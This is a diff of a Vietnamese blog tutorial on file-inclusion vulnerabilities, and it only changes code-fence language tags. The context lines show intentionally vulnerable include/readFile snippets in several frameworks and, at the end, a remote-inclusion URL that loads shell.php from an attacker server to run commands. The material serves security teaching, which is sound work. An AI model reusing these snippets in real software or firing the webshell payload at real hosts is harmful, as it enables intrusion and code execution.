@@ -26,7 +26,7 @@ image: "/src/content/posts/assets/lfi.png"
 * Chúng ta thấy rằng tham số `language` được truyền trực tiếp vào hàm `include()`. Do đó, bất kỳ đường dẫn nào chúng ta truyền vào tham số `language` sẽ được tải trên trang, bao gồm cả các tệp cục bộ trên máy chủ phía sau. Điều này không chỉ giới hạn ở hàm `include()`, vì còn nhiều hàm `PHP` khác cũng có thể dẫn đến lỗ hổng tương tự nếu chúng ta có quyền kiểm soát đường dẫn được truyền vào. Các hàm đó bao gồm `include_once()`, `require()`, `require_once()`, `file_get_contents()` và nhiều hàm khác.
 #### NodeJS
 * Cũng giống như `PHP`, các máy chủ web `NodeJS` cũng có thể tải nội dung dựa trên các tham số `HTTP`. Sau đây là một ví dụ cơ bản về cách tham số `GET language` được sử dụng để kiểm soát dữ liệu được ghi vào một trang:
-    ```js
+    ```javascript
     if(req.query.language) {
   fs.readFile(path.join(__dirname,req.query.language),function (err, data) {
         res.write(data);
@@ -35,7 +35,7 @@ image: "/src/content/posts/assets/lfi.png"
     ```
 * Như chúng ta thấy, bất kỳ tham số nào được truyền từ `URL` đều được sử dụng bởi hàm `readFile`, sau đó ghi nội dung của tệp vào phản hồi `HTTP`.
 * Một ví dụ khác là hàm `render()` trong framework `Express.js`. Ví dụ sau đây sử dụng tham số `language` để xác định thư mục mà nó sẽ lấy tệp `about.html`:
-    ```js
+    ```javascript
     app.get("/about/:language", function(req, res) {
     res.render(`/${req.params.language}/about.html`);
     });
@@ -43,28 +43,28 @@ image: "/src/content/posts/assets/lfi.png"
 * Không giống như các ví dụ trước đó, nơi tham số `GET` được chỉ định sau ký tự (?) trong `URL`, ví dụ trên lấy tham số từ đường dẫn URL (ví dụ: `/about/en hoặc /about/es`). Vì tham số được sử dụng trực tiếp trong hàm `render()` để chỉ định tệp được kết xuất, chúng ta có thể thay đổi `URL` để hiển thị tệp khác.
 #### Java
 * Cùng một khái niệm cũng áp dụng cho nhiều máy chủ web khác. Các ví dụ sau đây cho thấy cách các ứng dụng web cho máy chủ Java có thể bao gồm các tệp cục bộ dựa trên tham số được chỉ định, sử dụng hàm include:
-    ```jsp
+    ```java
     <c:if test="${not empty param.language}">
     <jsp:include file="<%= request.getParameter('language')%>" />
     </c:if>
     ```
 * Hàm `include` có thể lấy một tệp hoặc một `URL` trang làm tham số và sau đó hiển thị đối tượng này vào giao diện phía trước, tương tự như các ví dụ trước đó với `NodeJS`. Hàm import cũng có thể được sử dụng để kết xuất một tệp cục bộ hoặc một `URL`, chẳng hạn như ví dụ sau:
-    ```jsp
+    ```java
     <c:import url="<%= request.getParameter('language') %>"/>
     ```
 #### .NET
 * Cuối cùng, hãy xem một ví dụ về cách các lỗ hổng `File Inclusion` có thể xuất hiện trong các ứng dụng web `.NET`. Hàm `Response.WriteFile` hoạt động rất giống với tất cả các ví dụ trước đó, vì nó lấy đường dẫn tệp làm đầu vào và ghi nội dung của tệp đó vào phản hồi. Đường dẫn có thể được lấy từ tham số GET để tải nội dung động, như sau:
-    ```css
+    ```csharp
     @if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
     <% Response.WriteFile("<%HttpContext.Request.Query['language'] %>"); %> 
     }
     ```
 * Hơn nữa, hàm ``@Html.Partial()` cũng có thể được sử dụng để kết xuất tệp được chỉ định như một phần của giao diện phía trước, tương tự như những gì chúng ta đã thấy trước đó:
-    ```css
+    ```csharp
     @Html.Partial(HttpContext.Request.Query['language'])
     ```
 * Cuối cùng, hàm `include` cũng có thể được sử dụng để kết xuất các tệp cục bộ hoặc `URL` từ xa, và cũng có thể thực thi các tệp được chỉ định:
-    ```css
+    ```csharp
     <!--#include file="<% HttpContext.Request.Query['language'] %>"-->
     ```
 ### 3. Hậu quả
@@ -217,7 +217,7 @@ Hàm không hỗ trợ bao gồm `URL` từ xa.
 * Kế tiếp, thay vì dùng `Data wrapper` để đưa `Webshell` lên như `LFI` thì ở đây ta có thể mở một server `HTTP,FTP, hoặc SMB` để thực hiện connect từ `Webserver` đến local
 ![image](https://hackmd.io/_uploads/rJ1T5j2zJx.png)
 * Tiếp đó ta có thể truy cập vào local ở phần `URL` của `Webserver` như sau
-    ```url
+    ```text
     http://10.129.231.159/index.php?language=http://10.10.14.247:8080/shell.php&cmd=ls
     ```
 ![image](https://hackmd.io/_uploads/SkUA6ihMJe.png)
